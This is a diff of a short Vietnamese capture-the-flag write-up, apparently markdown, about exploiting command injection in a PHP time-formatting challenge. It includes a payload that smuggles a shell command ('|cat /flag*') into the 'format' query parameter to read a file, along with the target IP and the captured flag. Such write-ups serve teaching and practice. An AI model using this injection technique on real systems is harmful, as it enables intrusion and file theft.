@@ -3,6 +3,7 @@
 Mình sẽ show đoạn code cần quan tâm
 
 Nôm na đoạn này ta chỉ cần thêm tham số /?format=...
+
 ```php
 <?php
 class TimeController
@@ -15,7 +16,9 @@ class TimeController
     }
 }
 ```
+
 Hàm này sẽ thực thi nhưng chú ý ta cần phải bypass commnad
+
 ```php
 <?php
 class TimeModel
@@ -35,6 +38,7 @@ class TimeModel
 ```
 
 Payload:
+
 ```
 GET /?format=%Y-%m-%d%2b%H:%M:%S'|cat+/flag*+%23 HTTP/1.1
 Host: 18.143.200.117:31210
@@ -49,3 +53,4 @@ Upgrade-Insecure-Requests: 1
 
 Source: https://book.hacktricks.xyz/pentesting-web/command-injection
 
+Flag: CHH{datE_7iME_c0MManD_iNjectI0n_7edc7a102e657201d6e981c301a2722c}
